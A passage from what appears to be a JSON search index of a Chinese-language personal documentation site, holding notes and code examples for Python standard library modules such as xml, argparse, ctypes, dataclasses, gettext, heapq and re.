OID. uuid.NAMESPACE_X500 当指定这个命名空间时，name 字符串是 DER 或文本输出格式的 X.500 DN. uuid 模块为 variant 属性的可能值定义了以下常量: uuid.RESERVED_NCS 为NCS兼容性保留. uuid.RFC_4122 指定 RFC 4122 中给出的 UUID 布局. uuid.RESERVED_MICROSOFT 为微软的兼容性保留. uuid.RESERVED_FUTURE 保留给未来的定义.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-UUID.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-UUID.html"},{"title":"xml","text":"官网: https://docs.python.org/zh-cn/3/library/xml.html 处理 XML 的模块. 警告 XML 模块对于错误或恶意构造的数据是不安全的。 如果你需要解析不受信任或未经身份验证的数据，请使用 defusedxml 包: pip install defusedxml XML 处理子模块包括: xml.etree.ElementTree： ElementTree API，一个简单而轻量级的XML处理器 xml.dom：DOM API 定义 xml.dom.minidom：最小的 DOM 实现 xml.dom.pulldom：支持构建部分 DOM 树 xml.sax：SAX2 基类和便利函数 xml.parsers.expat：Expat解析器绑定 暂时只说常用的 xml.etree.ElementTree xml.etree.ElementTree 详见: https://docs.python.org/zh-cn/3/library/xml.etree.elementtree.html#module-xml.etree.ElementTree 实现了一个简单高效的API，用于解析和创建XML数据。 阻塞获取文件数据: import xml.etree.ElementTree as ET tree = ET.parse('country_data.xml') root = tree.getroot() 如果XML数据直接是字符串: root = ET.fromstring(country_data_as_string) root 具有标签和属性字典: >>> root.tag 'data' >>> root.attrib {} ElementTree方法: find() iterfind() findtext() iterparse() 命令空间的说明 在 XML 文档中,xmlns:s 和 xmlns 都用于定义命名空间,但有以下区别: xmlns:s 定义的是命名空间前缀 ,语法是: xmlns:s=\"http://www.w3.org/ns/example\" 这定义了一个名称为 \"s\" 的命名空间前缀,指向 \" http://www.w3.org/ns/example \" 这个命名空间。 然后在元素中,使用 \"s:\" 前缀来指示这个元素属于这个命名空间: <s:name>John</s:name> xmlns 定义的是默认命名空间 ,语法是: xmlns=\"http://www.w3.org/ns/example\" 这定义了默认命名空间为 \" http://www.w3.org/ns/example \"。 然后该默认命名空间作用域内的所有元素都属于这个命名空间,无须使用前缀: <name>John</name> 当 XML 文档中只定义一个命名空间时,通常使用默认命名空间。当定义多个命名空间,又想区分元素属于哪个命名空间时,才需要使用命名空间前缀. 如果一个元素既定义了默认命名空间,又定义了命名空间前缀,此时: 无前缀的元素属于默认命名空间 使用前缀的元素属于相应的命名空间 命名空间的处理 若使用映射字典: namespaces = { 's': 'http://schemas.xmlsoap.org/soap/envelope/', 'u': 'urn:schemas-upnp-org:service:ContentDirectory:1' } body = envelope.find('Body', namespaces) 这里,我们传入了一个字典,将前缀`s`映射到SOAP envelope命名空间,前缀`u`映射到UPnP ContentDirectory服务的命名空间。 这样,在查找元素时,我们可以使用前缀来限定命名空间,例如: browse = body.find('{urn:schemas-upnp-org:service:ContentDirectory:1}Browse') 等同于: browse = body.find('u:Browse', namespaces)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-XML.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-XML.html"},{"title":"argparse","text":"基本使用模板: # 导入argparse import argparse parser = argparse.ArgumentParser(description=\"Demo of argparse\") # 生成argparse对象 parser.add_argument('-n','--name', default=' Li ') # 增加参数 args = parser.parse_args() # 获取 add_argument参数列表: default # add_argument required # 这个参数是否一定需要设置 type # 参数类型 choices # 参数值只能从几个选项里面选择 help # 指定参数的说明信息 dest # 设置参数在代码中的变量名 nargs # 设置参数在使用可以提供的个数 # 值 含义 N # 参数的绝对个数（例如：3） '?' # 0或1个参数 '*' # 0或所有参数 '+' # 所有，并且至少一个参数 例: parser.add_argument('-n', defalut=1, required=True, type=int, choices=[1,2,3], help='is number', dest=iNum, nargs='?') 例子: import argparse def main(): parser = argparse.ArgumentParser(description=\"Demo of argparse\") parser.add_argument('-n','--name', default=' Li ') parser.add_argument('-y','--year', default='20') args = parser.parse_args() print(args) name = args.name year = args.year print('Hello {} {}'.format(name,year)) if __name__ == '__main__': main()","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-argparse.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-argparse.html"},{"title":"atexit","text":"官网: https://docs.python.org/zh-cn/3/library/atexit.html 退出处理器, 更正确一点来说, 是程序正常退出时候的退出处理器. atexit 模块定义了清理函数的注册和反注册函数. 被注册的函数会在解释器正常终止时执行. atexit 会按照注册顺序的*逆序*执行; 如果你注册了 A, B 和 C, 那么在解释器终止时会依序执行 C, B, A. 注解 通过该模块注册的函数, 在程序被未被 Python 捕获的信号杀死时并不会执行, 在检测到 Python 内部致命错误以及调用了 os._exit() 时也不会执行. 提供的两个api","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-atexit.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-atexit.html"},{"title":"cmath","text":"复数计算支持","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-cmath.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-cmath.html"},{"title":"contextlib","text":"contextlib --- 为 with语句上下文提供的工具 官网: https://docs.python.org/zh-cn/3/library/contextlib.html 此模块为涉及 with 语句的常见任务提供了实用的工具。 常用的两个装饰器: @contextlib.contextmanager @contextlib.asynccontextmanager","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-contextLib.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-contextLib.html"},{"title":"contextvars","text":"官网文档: https://docs.python.org/zh-cn/3/library/contextvars.html 上下文变量 本模块提供了相关API用于管理、存储和访问上下文相关的状态。 ContextVar 类用于声明 上下文变量 并与其一起使用。 函数 copy_context() 和类 Context 用于管理当前上下文和异步框架中。 在多并发环境中，有状态上下文管理器应该使用上下文变量， 而不是 threading.local() 来防止他们的状态意外泄露到其他代码 注解 在异步/多并发环境中(多进程/多线程都属于多并发), ContextVar(xxx).get() 获取的值是实时同步的最新的 ContextVar通过共享内存的方式提供了一种更轻量和Pythonic的不同任务间共享状态的机制. 但不适合不同进程间通信; 如果需要跨进程,还是更建议使用 from multiprocessing import Manager 常用有ContextVar ContextVar-用例 code: CONTEXT_EXAMPLE = ContextVar('context-example', default=list())","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-contextvars.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-contextvars.html"},{"title":"ctypes","text":"常用于加载C(++)模块 C与Python与ctypes类型 C Type Python Type ctypes Type char 1-character string c_char wchar_t 1-character Unicode string c_wchar char int/long c_byte char int/long c_ubyte short int/long c_short unsigned short int/long c_ushort int int/long c_int unsigned int int/long c_uint 1ong int/long c_long unsigned long int/long c_ulong long long int/long c_longlong unsigned long long int/long c_ulonglong float float c float double float c_double char * (NULL terminated) string or none c_charp wchar_t * (NULL terminated) unicode or none c_wchar_p void * int/long or none c_void_P 搜索库 模糊搜索本地存在的库: In [2]: from ctypes.util import find_library In [3]: find_library('SensApi') # 本地没有 In [4]: find_library('pthread') Out[4]: '/usr/lib/libpthread.dylib' 加载 加载dll, 如Windows下存在 SensApi.dll , 试加载: In [5]: import ctypes In [6]: ctypes.cdll.LoadLibrary('SensApi') --------------------------------------------------------------------------- OSError Traceback (most recent call last) Cell In [6], line 1 ----> 1 ctypes.cdll.LoadLibrary('SensApi') File /usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/ctypes/__init__.py:452, in LibraryLoader.LoadLibrary(self, name) 451 def LoadLibrary(self, name): --> 452 return self._dlltype(name) File /usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/ctypes/__init__.py:374, in CDLL.__init__(self, name, mode, handle, use_errno, use_last_error, winmode) 371 self._FuncPtr = _FuncPtr 373 if handle is None: --> 374 self._handle = _dlopen(self._name, mode) 375 else: 376 self._handle = handle OSError: dlopen(SensApi, 0x0006): tried: 'SensApi' (no such file), '/System/Volumes/Preboot/Cryptexes/OSSensApi' (no such file), '/usr/local/lib/SensApi' (no such file), '/System/Volumes/Preboot/Cryptexes/OS/usr/local/lib/SensApi' (no such file), '/usr/local/lib/SensApi' (no such file), '/System/Volumes/Preboot/Cryptexes/OS/usr/local/lib/SensApi' (no such file), '/usr/lib/SensApi' (no such file, not in dyld cache), 'SensApi' (no such file), '/usr/local/lib/SensApi' (no such file), '/usr/lib/SensApi' (no such file, not in dyld cache) In [7]: ctypes.cdll.LoadLibrary('libpthread.dylib') Out[7]: <CDLL 'libpthread.dylib', handle 485a6f120 at 0x107bac220> In [8]: ctypes.cdll.LoadLibrary('/usr/lib/libpthread.dylib') Out[8]: <CDLL '/usr/lib/libpthread.dylib', handle 485a6f120 at 0x1081f3a60> In [9]: 可以看出, 若只给一个模糊路径, 会在环境变量下查找是否存在, 不存在就报错. 若存在, 用绝对路径还是相对路径加载差距不大(除非在多个环境变量下包含同名库的不同实现). 定义结构体 C级别: /* A C data structure */ typedef struct Point { double x,y; } Point; Python级别, 以类的形式定义, _fields_ 定义其内变量: import ctypes # struct Point { } class Point(ctypes.Structure): _fields_ = [ ('x', ctypes.c_double), ('y', ctypes.c_double)] 访问C级别函数 注: 此处的 Point 已在上定义. C函数: /* Function involving a C data structure */ double distance(Point *p1, Point *p2) { return hypot(p1->x - p2->x, p1->y - p2->y); } Python加载: # _mod = ctypes.cdll.LoadLibrary(_path) # double distance(Point *, Point *) distance = _mod.distance distance.argtypes = (ctypes.POINTER(Point), ctypes.POINTER(Point)) distance.restype = ctypes.c_double 使用动态库 示例-使用动态库libc打印输出: # 系统: Mac from ctypes import CDLL, c_char_p from ctypes.util import find_library def do_c_print(data: str): # libc = CDLL(\"/Library/Developer/CommandLineTools/usr/lib/libclang.dylib\") libc = CDLL(\"libc.dylib\") lib_path = find_library(\"libc.dylib\") # 正确输出 libc.printf(b\"do_c_print0: %s\\n\", c_char_p(bytes(data, 'utf8'))) libc.printf(b\"do_c_print1: %s\\n\", bytes(data, 'utf8')) libc.printf(b\"do_c_print1: %s\\nlib path: %s\\n\", bytes(data, 'utf8'), bytes(lib_path, 'utf8')) # 不行, 必须转换为字节 libc.printf(\"do_c_print: %s\\n\\n\", data) if __name__ == '__main__': do_c_print(\"it is a c print message\") 可能是C那边是字节处理的原因, 所以调用的时候, Python的Unicode风格字符串 必须 转换为字节 才能被正常调用. 另外, find_library 好像找路径有点问题, 打印出来的结果是: /usr/lib/libc.dylib 但是实际系统找不到: $ ls /usr/lib/libc.dylib ls: /usr/lib/libc.dylib: No such file or directory 注解 argtypes 绑定形参列表类型 restype 绑定函数返回类型 注意类型签名绑定是比较重要的, 否则可能代码不能正常运行, 甚至导致整个Python解释器挂掉, 故建议进行签名绑定.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-ctypes.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-ctypes.html"},{"title":"dataclasses","text":"官网: https://docs.python.org/zh-cn/3/library/dataclasses.html 提供了一个装饰器和一些函数，用于自动添加生成的 special method，例如 __init__() 和 __repr__() 到用户定义的类。 装饰器使用 类属性的默认值 如果通过调用 field() 指定字段的默认值，则该字段的类属性将替换为指定的 default 值。 如果没有提供 default ，那么将删除类属性。目的是在 dataclass() 装饰器运行之后，类属性将包含字段的默认值，就像指定了默认值一样。 例如: @dataclass class C: x: int y: int = field(repr=False) z: int = field(repr=False, default=10) t: int = 20 类属性 C.z 将是 10 ，类属性 C.t 将是 20，类属性 C.x 和 C.y 将不设置(因为 没设置默认值 )。 Field 对象描述每个定义的字段。这些对象在内部创建，并由 fields() 模块级方法返回（见下文）。用户永远不应该直接实例化 Field 对象。 其有文档的属性是： name ：字段的名字。 type ：字段的类型。 default, default_factory, init, repr, hash, compare, metadata 和 kw_only 具有与 field() 函数中对应参数相同的含义和值。 可能存在其他属性，但它们是私有的，不能被审查或依赖。 注解 使用 @dataclasses 时, __init__() 方法将会调用 __post_init__() 方法 且具有继承关系的类时, __init__() 不会实现基类的 __init__(), 故有需求可以在 __post_init__() 里调用 具有继承关系时, 参数为其变量声明顺序(变量类型默认值会被覆盖). 关键字字段具有重新排序: 先顺序普通字段, 再顺序关键字字段. 类属性 dataclasses.MISSING 一个表示缺失 default 或 default_factory 的监视值。 dataclasses.KW_ONLY 一个用作类型标注的监视值。 任何在伪字段之后的类型为 KW_ONLY 的字段会被标记为仅限关键字字段。 请注意在其他情况下 KW_ONLY 类型的伪字段会被完全忽略。 这包括此类字段的名称。 根据惯例，名称 _ 会被用作 KW_ONLY 字段。 仅限关键字字段指明当类被实例化时 __init__() 形参必须以关键字形式来指定。 可用于 关键字字段重排序 . 在这个例子中，字段 y 和 z 将被标记为仅限关键字字段: @dataclass class Point: x: float _: KW_ONLY y: float z: float p = Point(0, y=1.5, z=2.0) 在单个数据类中，指定一个以上 KW_ONLY 类型的字段将导致错误。 继承时顺序 继承时, 顺序按照定义顺序, 但是类型会被覆盖(Python继承MRO机制): @dataclass class Base: x: Any = 15.0 y: int = 0 @dataclass class C(Base): z: int = 10 x: int = 15 最后的字段列表依次是 x 、 y 、 z 。 x 的最终类型是 int ，如类 C 中所指定的那样。 类似: def __init__(self, x: int = 15, y: int = 0, z: int = 10): ... 关键字字段重排序 仅限关键字字段的重新排序-使用 KW_ONLY 在计算出 __init__() 所需要的形参之后，任何仅限关键字形参会被移至所有常规（非仅限关键字）形参的后面。 这是 Python 中实现仅限关键字形参所要求的：它们必须位于非仅限关键字形参之后。 在这个例子中，Base.y, Base.w, and D.t 是仅限关键字字段，而 Base.x 和 D.z 是常规字段: @dataclass class Base: x: Any = 15.0 _: KW_ONLY y: int = 0 w: int = 1 @dataclass class D(Base): z: int = 10 # 注意这里也有 kw_only 参数 t: int = field(kw_only=True, default=0) 结果近似: def __init__(self, x: Any = 15.0, z: int = 10, *, y: int = 0, w: int = 1, t: int = 0): ...","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-dataclasses.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-dataclasses.html"},{"title":"datetime","text":"与 /docs/后端/python/python标准库/time 类似, 区别如下 time: 提供了与时间有关的函数和类型，包括获取当前时间、将时间戳转换为人类可读格式等 datetime: 提供了更灵活和强大的日期和时间操作功能，包括日期算术、日期格式化等。 示例: import datetime # 获取当前日期和时间 now = datetime.datetime.now() print(now) # 格式化日期字符串 date_str = now.strftime('%Y-%m-%d %H:%M:%S') print(date_str)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-datetime.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-datetime.html"},{"title":"decimal","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-decimal.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-decimal.html"},{"title":"dis","text":"官网: dis --- Python 字节码反汇编器 通过反汇编支持CPython的 bytecode 分析。 该模块作为输入的 CPython 字节码在文件 Include/opcode.h 中定义，并由编译器和解释器使用。 CPython 实现细节： 字节码是 CPython 解释器的实现细节。 不保证不会在Python版本之间添加、删除或更改字节码。不应考虑将此模块的跨 Python VM 或 Python 版本的使用。 示例：给出函数 myfunc(): def myfunc(alist): return len(alist) the following command can be used to display the disassembly of myfunc(): >>> dis.dis(myfunc) 2 0 RESUME 0 3 2 LOAD_GLOBAL 1 (NULL + len) 14 LOAD_FAST 0 (alist) 16 PRECALL 1 20 CALL 1 30 RETURN_VALUE","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-dis.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-dis.html"},{"title":"fileinput","text":"官网: https://docs.python.org/zh-cn/3/library/fileinput.html 迭代来自多个输入流的行 此模块实现了一个辅助类和一些函数用来快速编写访问标准输入或文件列表的循环。 如果你只想要读写一个文件请参阅 open()。 典型用法为: import fileinput for line in fileinput.input(encoding=\"utf-8\"): process(line) 此程序会迭代 sys.argv[1:] 中列出的所有文件内的行，如果列表为空则会使用 sys.stdin。 如果有一个文件名为 '-'，它也会被替换为 sys.stdin 并且可选参数 mode 和 openhook 会被忽略。 要指定替代文件列表，请将其作为第一个参数传给 input()。 也允许使用单个文件。 所有文件都默认以文本模式打开，但你可以通过在调用 input() 或 FileInput 时指定 mode 形参来重载此行为。 如果在打开或读取文件时发生了 I/O 错误，将会引发 OSError。 在 3.3 版更改: 原来会引发 IOError；现在它是 OSError 的别名。 如果 sys.stdin 被使用超过一次，则第二次之后的使用将不返回任何行， 除非是被交互式的使用，或都是被显式地重置 (例如使用 sys.stdin.seek(0))。 空文件打开后将立即被关闭；它们在文件列表中会被注意到的唯一情况只有当最后打开的文件为空的时候。 反回的行不会对换行符做任何处理，这意味着文件中的最后一行可能不带换行符。 你可以通过将 openhook 形参传给 fileinput.input() 或 FileInput() 来提供一个打开钩子以便控制文件的打开方式。 此钩子必须为一个函数，它接受两个参数 filename 和 mode，并返回一个以相应模式打开的文件类对象。 如果指定了 encoding 和/或 errors，它们将作为额外的关键字参数被传给这个钩子。 此模块提供了一个 hook_compressed() 来支持压缩文件。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-fileinput.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-fileinput.html"},{"title":"fnmatch模块","text":"介于普通字符串与 /docs/后端/python/python标准库/re 之间的字符串操作模块 fnmatch 模块提供了两个函数——fnmatch() 和 fnmatchcase() ，可以用来实现 这样的匹配。用法如下: if any(name.endswith(('.c', '.h')) for name in listdir(dirname)): ... >>> from fnmatch import fnmatch, fnmatchcase >>> fnmatch('foo.txt', '*.txt') True >>> fnmatch('foo.txt', '?oo.txt') True >>> fnmatch('Dat45.csv', 'Dat[0-9]*') True >>> names = ['Dat1.csv', 'Dat2.csv', 'config.ini', 'foo.py'] >>> [name for name in names if fnmatch(name, 'Dat*.csv')] ['Dat1.csv', 'Dat2.csv'] >>> fnmatch() 函数使用底层操作系统的大小写敏感规则 (不同的系统是不一样的) 来 匹配模式。比如: >>> # On OS X (Mac) >>> fnmatch('foo.txt', '*.TXT') False >>> # On Windows >>> fnmatch('foo.txt', '*.TXT') True >>> 可以使用 fnmatchcase() 来代替。它完全使用你的模 式大小写匹配。比如: >>> fnmatchcase('foo.txt', '*.TXT') False >>> fnmatch 使用底层操作系统的大小写敏感规则 (不同的系统是不一样的) 来 匹配模式: >>> # On OS X (Mac) >>> fnmatch('foo.txt', '*.TXT') False >>> # On Windows >>> fnmatch('foo.txt', '*.TXT') True >>> fnmatchcase","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-fnmatch.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-fnmatch.html"},{"title":"fractions","text":"支持分数运算, 如: >>> from fractions import Fraction >>> a = Fraction(5, 4) >>> b = Fraction(7, 16) >>> print(a + b) 27/16 >>> # Getting numerator/denominator >>> c = a * b >>> c.numerator 35 >>> c.denominator 64","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-frames.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-frames.html"},{"title":"gettext模块","text":"官网文档:: gettext 多语种国际化服务 为 Python 模块和应用程序提供国际化 (Internationalization, I18N) 和本地化 (Localization, L10N) 服务. 支持 GNU gettext 消息编目 API. GUN_gettext_API 支持 高级的、基于类的 API. 可能更适合于 Python 文件 GNU gettext API 使用该 API，将会对整个应用程序产生全局的影响。 如果你的应用程序支持多语种，而语言选择取决于用户的语言环境设置，这通常正是你所想要的。 而如果你正在本地化某个 Python 模块，或者你的应用程序需要在运行时切换语言，相反你或许想用基于类的API: api_base_class 。 API: bindtextdomain textdomain gettext dgettext ngettext dngettext pgettext dpgettext npgettext dnpgettext bindtextdomain textdomain gettext dgettext ngettext dngettext pgettext dpgettext npgettext dnpgettext 注意，GNU gettext 还定义了 dcgettext() 方法，但它被认为不实用，因此目前没有实现它。 这是该 API 的典型用法示例: import gettext gettext.bindtextdomain('myapplication', '/path/to/my/language/directory') gettext.textdomain('myapplication') _ = gettext.gettext # ... print(_('This is a translatable string.')) 基于类的 API 与 GNU gettext API ( GUN_gettext_API ) 相比，gettext 模块的基于类的 API 提供了更多的灵活性和更强的便利性。 这是本地化 Python 应用程序和模块的推荐方法。 gettext 定义了一个 GNUTranslations 类，该类实现了 GNU .mo 格式文件的解析，并且具有用于返回字符串的方法。 本类的实例也可以将自身作为函数 _() 安装到内建命名空间中。 API: find translation install find translation install 本地化 部分本地化: import gettext t = gettext.translation('spam', '/usr/share/locale') _ = t.gettext 全局本地化: import gettext lang1 = gettext.translation('myapplication', languages=['en']) lang2 = gettext.translation('myapplication', languages=['fr']) lang3 = gettext.translation('myapplication', languages=['de']) # start by using language1 lang1.install() # ... time goes by, user selects language 2 lang2.install() # ... more time goes by, user selects language 3 lang3.install() [1] 不同系统的默认语言环境目录是不同的； 比如在 RedHat Linux 上是 /usr/share/locale， 在 Solaris 上是 /usr/lib/locale。 gettext 模块不会支持这些基于不同系统的默认值； 而它的默认值为 sys.base_prefix/share/locale （请参阅 sys.base_prefix）。 基于上述原因，最好每次都在应用程序的开头使用明确的绝对路径来调用 bindtextdomain 。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-gettext.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-gettext.html"},{"title":"heapq","text":"官网: heapq --- 堆队列算法 模块提供了堆队列算法的实现，也称为优先队列算法. 堆是一个二叉树，它的每个父节点的值都只会小于或等于所有孩子节点（的值）。 它使用了数组来实现：从零开始计数，对于所有的 k ，都有 heap[k] <= heap[2*k+1] 和 heap[k] <= heap[2*k+2]。 为了便于比较，不存在的元素被认为是无限大。 堆最有趣的特性在于最小的元素总是在根结点：heap[0]。 堆的分类 大根堆 大根堆的每个子树，根节点是整个树中最大的数据， 每个节点的数据都比其子节点大 小根堆 小根堆的根节点数据是最小的数据，每个节点的数据都比其子节点小 API与教材的堆算法实现有所不同，具体区别有两方面 我们使用了从零开始的索引。 这使得节点和其孩子节点索引之间的关系不太直观但更加适合，因为 Python 使用从零开始的索引。 我们的 pop 方法返回最小的项而不是最大的项（这在教材中称为\"最小堆\"；而\"最大堆\"在教材中更为常见，因为它更适用于原地排序）。 创建一个堆，可以使用list来初始化为 [] ，或者你可以通过一个函数 heapify() ，来把一个list转换成堆。 支持函数 heappush , 推入值到堆 heappop , 弹出值 heappushpop , 相当于 先做 heappush , 再做 heappop heapify , 将 list 原地转换为 堆 heapreplace merge nlargest nsmallest 该模块还提供了三个基于堆的通用功能函数。 后两个函数在 n 值较小时性能最好。 对于更大的值，使用 sorted() 函数会更有效率。 此外，当 n==1 时，使用内置的 min() 和 max() 函数会更有效率。 如果需要重复使用这些函数，请考虑将可迭代对象转为真正的堆。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-heapq.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-heapq.html"},{"title":"re","text":"通过正则表达式对字符串进⾏匹配 r 在带有 'r' 前缀的字符串字面值中，反斜杠不必做任何特殊处理。 因此 r\"n\" 表示包含 '' 和 'n' 两个字符的字符串， 而 \"n\" 则表示只包含一个换行符的字符串。 re.match函数 re.compile 函数 compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用: prog = re.compile(pattern) result = prog.match(string) 等价于: result = re.match(pattern, string) 不过对于匹配使用的较多情况下, 可以使用全局的compile来节省时间. 举例: >>>import re >>> pattern = re.compile(r'\\d+') m = pattern.match('one12twothree34four', 3, 10) # 从'1'的位置开始匹配，正好匹配 >>> print m # 返回一个 Match 对象 <_sre.SRE_Match object at 0x10a42aac0> >>> m.group(0) # 可省略 0 '12' >>> m.start(0) # 可省略 0 3 >>> m.end(0) # 可省略 0 5 >>> m.span(0) # 可省略 0 (3, 5) 在上面，当匹配成功时返回一个 Match 对象，其中： group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(0)； start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0； end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0； span([group]) 方法返回 (start(group), end(group)) re.search函数 re.search 扫描整个字符串并返回第一个成功的匹配，如果没有匹配，就返回一个 None。 re.match与re.search的区别: re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None re.search匹配整个字符串，直到找到一个匹配 举例: import re ret = re.search(r\"\\d+\", \"阅读次数为9999\") print(ret.group()) #结果：9999 re.findall函数 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。 注意： match 和 search 是匹配一次 findall 匹配所有。 举例: import re ret = re.findall(r\"\\d+\", \"python = 9999, c = 7890, c++ = 12345\") print(ret) #结果：['9999', '7890', '12345'] 举例2: import re alist = ['a','b','c'] if re.findall('.$','dfghc')[0] in alist: print 'yes1' if re.findall('.$','dfgh')[0] in alist: print 'yes2' print 'over' #输出： #yes1 #over #re.findall('.$','dfghc')其实是返回一个列表 #但是匹配是找出结尾的字符所以只有一个，使用[0]获取 #然后判断是否存在于alist re.finditer函数 和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回: import re it = re.finditer(r\"\\d+\", \"12a32bc43jf3\") for match in it: print(match.group()) #结果： #12 #32 #43 #3 re.sub函数 sub是substitute的所写，表示替换，将匹配到的数据进⾏替换。 举例：将匹配到的阅读次数加1 方法一: import re ret = re.sub(r\"\\d+\", '998', \"python = 997\") print(ret) 结果：python = 998 方法二: import re def add(temp): #int（）参数必须是字符串，类似字节的对象或数字，而不是\"re.Match\" strNum = temp.group() num = int(strNum) + 1 return str(num) ret = re.sub(r\"\\d+\", add, \"python = 997\") print(ret) ret = re.sub(r\"\\d+\", add, \"python = 99\") print(ret) #这里不懂是怎么把后面的参数传递过去的， #好像python就是这样传递参数的？但是有尝试将temp打印，出来是一个地址好像，并不是预期的字符串 #理解是正常情况下传递的应该是整个字符串，但是这里使用了正则表达式匹配数字，所以只传递了数字，然后使用group函数来获取 #根据这个思路尝试了一下 #将匹配规则更改为\"r\".+\",输出temp.group的值正常，temp为地址，re会将参数传递更改为地址传递 结果: python = 998 python = 100 re.subn函数 行为与sub()相同，但是返回一个元组 (字符串, 替换次数): re.subn(pattern, repl, string[, count]) 返回: (sub(repl, string[, count]), 替换次数) 例如: import re pattern = re.compile(r'(\\w+) (\\w+)') s = 'i say, hello world!' print(re.subn(pattern, r'\\2 \\1', s)) def func(m): return m.group(1).title() + ' ' + m.group(2).title() print(re.subn(pattern, func, s)) ### output ### # ('say i, world hello!', 2) # ('I Say, Hello World!', 2) re.split函数 根据匹配进⾏切割字符串，并返回⼀个列表。 举例: import re ret = re.split(r\":| \",\"info:xiaoZhang 33 shandong\") print(ret) 结果：['info', 'xiaoZhang', '33', 'shandong'] python贪婪和⾮贪婪 Python⾥数量词默认是贪婪的（在少数语⾔⾥也可能是默认⾮贪婪），总是尝试匹配尽可能多的字符；⾮贪婪则相反，总是尝试匹配尽可能少的字符。 例如：正则表达式\"ab*\"如果用于查找\"abbbc\"，将找到\"abbb\"。而如果使用非贪婪的数量词\"ab*?\"，将找到\"a\"。 注：我们一般使用非贪婪模式来提取。 在\"*\",\"?\",\"+\",\"{m,n}\"后⾯加上？，使贪婪变成⾮贪婪。 举例1: import re s=\"This is a number 234-235-22-423\" #正则表达式模式中使⽤到通配字，那它在从左到右的顺序求值时，会尽量\"抓取\"满⾜匹配最⻓字符串，在我们上⾯的例⼦⾥⾯，\".+\"会从字符串的启始处抓取满⾜模式的最⻓字符，其中包括我们想得到的第⼀个整型字段的中的⼤部分，\"\\d+\"只需⼀位字符就可以匹配，所以它匹配了数字\"4\"，⽽\".+\"则匹配了从字符串起始到这个第⼀位数字4之前的所有字符 r=re.match(\".+(\\d+-\\d+-\\d+-\\d+)\",s) print(r.group(1)) #⾮贪婪操作符\"？\"，这个操作符可以⽤在\"*\",\"+\",\"?\"的后⾯，要求正则匹配的越少越好 r=re.match(\".+?(\\d+-\\d+-\\d+-\\d+)\",s) print(r.group(1)) 结果: 4-235-22-423 234-235-22-423 举例2: >>> re.match(r\"aa(\\d+)\",\"aa2343ddd\").group(1) '2343' >>> re.match(r\"aa(\\d+?)\",\"aa2343ddd\").group(1) '2' >>> re.match(r\"aa(\\d+)ddd\",\"aa2343ddd\").group(1) '2343' >>> re.match(r\"aa(\\d+?)ddd\",\"aa2343ddd\").group(1) '2343' 举例3：提取图片地址: import re test_str=\"<img data-original=https://rpic.douyucdn.cn/appCovers/2016/11/13/1213973.jpg>\" ret = re.search(r\"https://.*?.jpg\", test_str) print(ret.group()) r的作⽤ r：在带有 'r' 前缀的字符串字面值中，反斜杠不必做任何特殊处理。 因此 r\"n\" 表示包含 '' 和 'n' 两个字符的字符串，而 \"n\" 则表示只包含一个换行符的字符串。 与大多数编程语言相同，正则表达式里使用\"\"作为转义字符，这就可能造成反斜杠困扰。假如你需要匹配文本中的字符\"\"，那么使用编程语言表示的正则表达式里将需要4个反斜杠\"\\\\\"：前两个和后两个分别用于在编程语言里转义成反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠。Python里的原生字符串很好地解决了这个问题，Python中字符串前⾯加上 r 表示原⽣字符串。 （前两个和后两个分别用于在编程语言里转义成反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠。） 例: import re mm = \"c:\\\\a\\\\b\\\\c\" print(mm)#c:\\a\\b\\c ret = re.match(\"c:\\\\\\\\\",mm).group() print(ret)#c:\\ ret = re.match(\"c:\\\\\\\\a\",mm).group() print(ret)#c:\\a ret = 